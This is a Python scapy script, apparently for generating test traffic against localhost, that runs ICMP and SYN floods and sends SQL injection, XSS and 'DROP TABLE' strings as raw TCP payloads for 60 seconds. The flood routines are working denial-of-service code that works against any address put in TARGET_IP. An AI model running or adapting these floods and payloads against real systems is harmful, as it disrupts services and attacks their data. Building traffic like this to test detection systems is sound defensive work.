#!/usr/bin/env python3
import time
import threading
from scapy.all import IP, ICMP, TCP, Raw, send

TARGET_IP = "127.0.0.1"  # Test on localhost
TARGET_PORT = 8080       # Arbitrary port for TCP payload tests
RUN_TIME = 60            # Run attacks for 60 seconds

# ---------------- ICMP Flood ----------------
def icmp_flood():
    pkt = IP(dst=TARGET_IP)/ICMP()
    while True:
        send(pkt, verbose=False)
        time.sleep(0.01)  # Adjust to control flood speed

# ---------------- SYN Flood ----------------
def syn_flood():
    pkt = IP(dst=TARGET_IP)/TCP(dport=TARGET_PORT, flags="S")
    while True:
        send(pkt, verbose=False)
        time.sleep(0.01)

# ---------------- Suspicious Payload ----------------
def payload_attack():
    patterns = ["' OR 1=1", "<script>alert(1)</script>", "DROP TABLE users;"]
    for pattern in patterns:
        pkt = IP(dst=TARGET_IP)/TCP(dport=TARGET_PORT)/Raw(load=pattern)
        send(pkt, verbose=False)
        time.sleep(0.05)

# ---------------- Main ----------------
if __name__ == "__main__":
    print(f"[+] Starting attack simulation on {TARGET_IP} for {RUN_TIME} seconds...")

    threads = [
        threading.Thread(target=icmp_flood, daemon=True),
        threading.Thread(target=syn_flood, daemon=True),
        threading.Thread(target=payload_attack, daemon=True)
    ]

    for t in threads:
        t.start()

    start_time = time.time()
    try:
        while time.time() - start_time < RUN_TIME:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Attack simulation stopped by user.")

    print("[+] Attack simulation finished.")
